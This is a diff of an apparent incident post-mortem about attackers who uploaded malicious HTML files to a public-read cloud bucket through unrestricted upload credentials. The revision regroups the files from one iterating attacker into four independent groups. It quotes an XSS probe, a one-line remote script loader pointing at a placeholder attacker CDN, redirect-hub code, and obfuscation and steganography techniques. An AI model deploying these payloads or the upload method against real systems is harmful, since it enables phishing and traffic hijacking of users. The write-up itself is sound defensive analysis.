@@ -96,31 +96,39 @@ The earliest file was from November 2024. The most recent was from a few days ag
 
 ---
 
-## The Full Picture: 47 Files, 5 Generations
+## The Full Picture: 47 Files, 4 Attacker Groups
 
-Sorting by upload date showed the attacker's development process: five generations, each more sophisticated than the last. Like reading commit history.
+Our initial assumption was that we were looking at one attacker iterating from simple to complex. The timeline disproved that. The earliest file (November 2024) was a fully operational traffic redirect hub with jQuery and WeChat detection. Seven months later, a one-line `<svg onload=alert(0)>` probe appeared — from a completely different upload path, hitting a completely different backend domain.
 
-### Generation 1: XSS Probe
+We analyzed all 47 files. Zero domain overlap between groups. Completely different obfuscation techniques. Different upload path prefixes, meaning different hijacked user sessions. Conclusion: at least four independent attacker groups found and exploited the same bucket, each with their own infrastructure.
+
+### Group A: XSS Probe + Remote Script Loaders (~30 files)
+
+The most prolific group by file count. Their approach was methodical:
+
+**Step 1 — Probe:**
 
 ```html
 <svg onload=alert(0)>
 ```
 
-One line. The attacker was testing whether the bucket serves HTML files that execute JavaScript in the browser. The answer was yes — SVG script execution confirmed. The bucket served files without a `Content-Disposition: attachment` header, so the browser rendered them directly. This probe confirmed the bucket was a viable delivery platform; Generation 2 would test HTML specifically.
+One line. Testing whether the bucket serves files that execute JavaScript in the browser. The answer was yes — SVG script execution confirmed. The bucket served files without a `Content-Disposition: attachment` header, so the browser rendered them directly.
 
-### Generation 2: Remote Script Loaders (20 files)
+**Step 2 — Batch deployment:**
 
 ```html
 <body onload=import("//<attacker-cdn>/payload.js")>
 ```
 
-Also one line. Using `import()` to dynamically load a remote JS module. Each file was only 71 bytes. (This requires the attacker-controlled CDN to serve the file with permissive CORS headers — a setup cost, but not a meaningful barrier.) The attacker uploaded 20 copies in quick succession with incrementing filenames (`tmp_xxx0.html`, `tmp_xxx1.html`...), likely batch testing or A/B experimentation.
+Also one line. Using `import()` to dynamically load a remote JS module hosted on Alibaba Cloud OSS. Each file was only 71 bytes. (This requires the attacker-controlled CDN to serve the file with permissive CORS headers — a setup cost, but not a meaningful barrier.) They uploaded 20 copies in quick succession with incrementing filenames (`tmp_xxx0.html`, `tmp_xxx1.html`...), then another batch of 10 two months later with a different payload URL on the same CDN.
 
-### Generation 3: Nested HTML Pages (10 files)
+A third batch contained nested `<html>` pages at 1.6KB each — more structured than the one-liners, still from the same upload path prefix.
 
-1.6KB each, containing nested `<html>` tags with `lang="zh-cn"`. More structured than the one-liners, but still from the same upload path prefix. The attacker was building up complexity.
+### Group B: Traffic Redirect Hub (7 files)
 
-### Generation 4: Traffic Redirect Hub (5 files)
+The earliest attacker to find the bucket (November 2024) and the most technically mature. Two types of files:
+
+**Redirect pages** (5 files, 178KB each, uploaded within 73 seconds):
 
 ```html
 <title>Official Verification</title>
@@ -153,35 +161,51 @@ function iframe(src) {
 }
 ```
 
-This is not a phishing page. It is a **traffic redirect hub**. The attacker's backend (`rpa.php`) dynamically decides where to send the visitor. The page itself is just a relay. The actual destination could be anything: gambling, fraud, pornography, phishing, app downloads. The attacker controls it server-side and can change it at any time.
+This is not a phishing page. It is a **traffic redirect hub**. The backend (`rpa.php`) dynamically decides where to send the visitor. The page itself is just a relay. The actual destination could be anything: gambling, fraud, pornography, phishing, app downloads. The attacker controls it server-side and can change it at any time.
 
 The WeChat/QQ user agent detection is telling. These pages were designed to spread through Chinese social messaging apps. In a regular browser, the page does a full redirect. In WeChat or QQ, it loads the target in an iframe instead, because these apps intercept top-level navigations for content filtering, while iframes bypass those hooks.
 
 The page also blocks F12 with a fake alert: "Thank you for using the management platform. Console operations are prohibited." A small touch to discourage curious users from inspecting the source.
 
-All 5 files were nearly identical, uploaded within a 3-minute window on the same day. The attacker was debugging the redirect flow.
-
 When the cloud provider eventually flagged one of these files months later, they classified it as "pornographic content." They were not wrong, exactly. At the time they scanned it, the backend happened to be redirecting to pornographic sites. But they missed the bigger picture: this was a general-purpose traffic distribution platform, not a static porn page. The redirect target could change hourly.
 
-### Generation 5: Obfuscated Phishing Pages (5 files)
-
-The final form. The loading page described at the top of this article: full loading animation, commercial-grade JS obfuscation, remote content injection, dynamic page replacement. Two of the five used `jsjiami.com` v7 obfuscation; the other three used a different `_0x`-style obfuscation. The most recent one was uploaded days before the cloud provider's alert.
-
-### Also Found: A CDN API Proxy (1 file)
+**CDN API proxy** (1 file):
 
 ```html
 <!-- Upload this file to CDN, can be used as an API endpoint -->
 ```
 
-The attacker left a comment explaining their intent. An HTML file hosted on a CDN becomes an API relay when its JavaScript reads query parameters and forwards them to an attacker-controlled endpoint — requests then appear to originate from your domain, bypassing IP blocks or origin restrictions on the attacker's real infrastructure.
+The attacker left a comment explaining their intent. An HTML file hosted on a CDN becomes an API relay when its JavaScript reads query parameters and forwards them to an attacker-controlled endpoint — requests then appear to originate from your domain, bypassing IP blocks or origin restrictions on the attacker's real infrastructure. This proxy used a different domain but the same `rpa.php` endpoint pattern, linking it to the same group.
 
-### Remaining Files (5 files)
+### Group C: Obfuscated Phishing (8 files)
 
-Two files disguised as PNGs (binary image data with `.html` extension) used for probing, and three empty or near-empty test files. Attacker leftovers from the experimentation phase.
+The group that triggered the cloud provider alert. They deployed **byte-identical files across three different hijacked user sessions** — the strongest evidence that the same attacker was operating across multiple compromised accounts.
+
+Two techniques:
+
+**Custom obfuscation** (base64 + XOR, backed by `dunapi.sqsafk.cn`): loading animation with a "loding" typo in the title, custom XOR decryption layer, remote content injection.
+
+**Commercial obfuscation** (jsjiami.com v7): the loading page described at the top of this article. Full loading animation, RC4 + base64 multi-layer decryption, `document.write()` page replacement. The most recent file was uploaded days before the cloud provider's alert.
+
+They also deployed a fake news page mimicking a well-known Chinese content platform, designed to harvest user information.
+
+### Group D: PNG Steganography (2 files)
+
+The most unusual technique. Files started with real PNG/JFIF image headers (passing basic file type checks), followed by a hidden `<div>` containing base64 + XOR encoded JavaScript. A custom decoder function extracted and executed the payload, loading a remote script from yet another domain with no connection to any of the other groups.
+
+### How We Know They Are Independent
+
+| Evidence | What it shows |
+|----------|--------------|
+| Zero domain overlap | Five distinct backend domain clusters, no file in any group references a domain from another group |
+| Different techniques | Bare HTML, jQuery wrapper, base64+XOR, jsjiami commercial obfuscation, PNG steganography — five different approaches |
+| Different upload paths | Each group operated from different hijacked user sessions |
+| Cross-tenant identical files | Group C deployed the same file across three user paths — proving one attacker, multiple sessions |
+| Timeline vs. sophistication | Group B (fully operational redirect hub) appeared 7 months before Group A (one-line XSS probe) — not a plausible iteration sequence |
 
 ---
 
-## How the Attacker Got Upload Access
+## How the Attackers Got Upload Access
 
 Our bucket was private-write, public-read. Users cannot upload directly to the bucket. The upload flow was standard:
 
@@ -200,14 +224,14 @@ The problem: **the credentials had no restrictions**.
 - No path restriction. The attacker could set any object key.
 - Credential TTL was in hours. Plenty of time.
 
-All the attacker needed to do:
+All an attacker needed to do:
 
-1. Get an account (or obtain any existing user's session)
+1. Hijack an existing user's session (accounts are admin-provisioned, not self-registered)
 2. Call the upload API to get a credential
 3. Upload an `.html` file using that credential
 4. Construct the public URL and start distributing
 
-No exploit needed. No vulnerability in the traditional sense. Just "legitimate" use of an overly permissive API.
+No exploit needed. No vulnerability in the traditional sense. Just "legitimate" use of an overly permissive API. Four independent groups found and exploited the same gap over 15 months.
 
 ---
 
@@ -259,7 +283,7 @@ Monitor upload extensions: any `.html` or `.js` file appearing in a bucket that 
 
 1. **"Private write" does not mean secure.** As long as you have an upload API that hands out credentials, and those credentials are unrestricted, attackers can upload anything.
 
-2. **Attackers iterate, and your bucket becomes infrastructure.** We watched an attacker's development lifecycle play out in our bucket. It started with a one-line `<svg onload=alert(0)>` probe to confirm the bucket renders HTML. Then 20 rapid-fire script loaders to test payload delivery. Then nested HTML experiments. Then a traffic redirect hub with WeChat/QQ detection, optimized for distribution through Chinese social messaging apps. Finally, obfuscated loading pages with remote content injection. Once they find a bucket that works, they keep coming back and refining their approach. The 3-minute upload burst on the redirect pages shows them debugging in real-time. It was a sustained operation, and your domain reputation was funding it.
+2. **An unguarded bucket gets found by multiple parties independently.** We initially assumed one attacker iterating over 15 months. The evidence showed at least four independent groups — different domains, different techniques, different hijacked sessions — all exploiting the same unrestricted upload API. This was not a targeted attack. It was an open door that kept getting discovered. Your domain reputation was funding all of them.
 
 3. **Do not rely on your cloud provider's security scanner.** 47 files, 15 months, 1 detection. When they finally flagged one, they classified it as "pornographic content" because the dynamic redirect happened to be pointing at porn that day. They missed that it was a general-purpose traffic distribution platform. Signature-based scanning cannot keep up with server-controlled dynamic payloads. Run your own scans.
 
